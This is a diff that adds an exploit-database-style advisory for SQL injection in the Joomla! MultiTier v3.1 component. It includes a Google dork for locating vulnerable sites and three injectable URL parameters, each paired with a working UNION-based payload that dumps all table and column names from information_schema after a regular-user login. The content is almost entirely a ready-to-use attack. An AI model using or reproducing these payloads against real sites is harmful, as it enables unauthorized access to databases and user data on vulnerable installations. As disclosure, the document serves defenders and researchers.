@@ -1,0 +1,23 @@
+# # # # # 
+# Exploit Title: Joomla! Component MultiTier v3.1 - SQL Injection
+# Google Dork: inurl:index.php?option=com_multitier
+# Date: 23.02.2017
+# Vendor Homepage: http://www.beesto.com/
+# Software Buy: https://extensions.joomla.org/extensions/extension/ads-a-affiliates/affiliate-systems/multitier/
+# Demo: http://www.beesto.com/extensions/13-j-multitier/40-demo
+# Version: 3.1
+# Tested on: Win7 x64, Kali Linux x64
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Mail : ihsan[@]ihsan[.]net
+# # # # #
+# SQL Injection/Exploit :
+# Login as regular user
+# http://localhost/[PATH]/index.php/component/multitier/?mtpage=takecodel&tid=1&lid=[SQL]
+# -66'+/*!50000union*/+select+1,0x496873616e2053656e63616e,3,4,5,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),7,8+-- -
+# http://localhost/[PATH]/index.php/component/multitier/?mtpage=link_preview&id=[SQL]
+# -66'+/*!50000union*/+select+1,0x496873616e2053656e63616e,3,4,5,(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),7,8+-- -
+# http://localhost/[PATH]/index.php/component/multitier/?mtpage=takecodeb&tid=1&bid=[SQL]
+# -66'+/*!50000union*/+select+(Select+export_set(5,@:=0,(select+count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2)),2,3+-- -
+# # # # #
